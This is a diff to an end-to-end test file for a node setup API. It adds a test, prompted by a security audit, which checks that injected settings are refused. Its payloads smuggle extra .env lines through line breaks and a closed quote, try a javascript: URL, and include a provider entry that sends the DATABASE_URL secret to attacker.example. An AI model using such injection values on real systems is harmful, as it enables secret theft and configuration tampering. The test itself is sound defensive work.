@@ -42,6 +42,8 @@
  *   AIMEAT_PORT=<a free port> AIMEAT_DB_PATH=test/.test-e2e-setup-verification.db \
  *     node --env-file=.env.test.sqlite --import tsx test/run-e2e-ci.ts --test=e2e-setup-and-verification
  * @version-history
+ *   v1.2.0 — 2026-10-09 — Test 5b: a node setting that would add a line to .env, or is not a value
+ *     the node takes, is refused before the owner is created (secrets audit 2026-10-09, S1).
  *   v1.1.0 — 2026-09-08 — Test 24 asserts that anonymous mode no longer locks a fresh node out of
  *     its own setup (fixed in src/routes/setup.ts) instead of pinning the lock.
  *   v1.0.0 — 2026-09-08 — Initial. 25 tests, 12 of them refusals, and three nodes booted of its own.
@@ -285,6 +287,35 @@ try {
                 assert(body.error?.code === 'INVALID_INPUT', `${what}: code ${body.error?.code}`);
             }
             // Nothing above created anything: the node is still empty.
+            const after = await call(setupNode.base, '/v1/setup/status');
+            assert(after.body.data.needsSetup === true, 'a refused init leaves the node uninitialised');
+        });
+
+        await test('5b. A node setting that would add a line to .env, or is not a value the node takes, is refused', async () => {
+            // Secrets audit 2026-10-09, node configuration S1. The four settings went into .env
+            // unescaped, so a line break added any variable; AIMEAT_AI_PROVIDERS naming DATABASE_URL
+            // as a key then sent it to the caller's server after a restart. Each must be refused
+            // BEFORE the owner is created (invariant 14), so the node stays empty.
+            const owner = { username: SETUP_USER, password: SETUP_PASSWORD };
+            const provider = '[{"id":"x","type":"openai-compatible","baseUrl":"https://attacker.example/v1","auth":{"type":"env","env":"DATABASE_URL"}}]';
+            const refusals: Array<[string, Record<string, unknown>]> = [
+                ['a genesis URL with a line break', { genesisUrl: `https://genesis.example\nAIMEAT_AI_PROVIDERS=${provider}`, owner }],
+                ['a node id with a line break', { nodeId: 'node-a\nAIMEAT_ANONYMOUS=true', owner }],
+                ['a node type that closes its quote', { nodeType: 'full"\nAIMEAT_DEV_MODE="true', owner }],
+                ['a locale with a carriage return', { locale: 'en\r\nAIMEAT_DEV_MODE=true', owner }],
+                ['a node type the node does not have', { nodeType: 'galaxy', owner }],
+                ['a node id with a space', { nodeId: 'my node', owner }],
+                ['a genesis URL that is not http(s)', { genesisUrl: 'javascript:alert(1)', owner }],
+                ['a genesis URL with credentials in it', { genesisUrl: 'https://user:pw@genesis.example', owner }],
+                ['a locale that is not a language tag', { locale: 'en_US.UTF-8', owner }],
+            ];
+            for (const [what, payload] of refusals) {
+                const { status, body } = await call(setupNode.base, '/v1/setup/init', {
+                    method: 'POST', body: JSON.stringify(payload),
+                });
+                assert(status === 400, `${what}: expected 400, got ${status} ${JSON.stringify(body.error ?? body.data?.owner)}`);
+                assert(body.error?.code === 'INVALID_INPUT', `${what}: code ${body.error?.code}`);
+            }
             const after = await call(setupNode.base, '/v1/setup/status');
             assert(after.body.data.needsSetup === true, 'a refused init leaves the node uninitialised');
         });
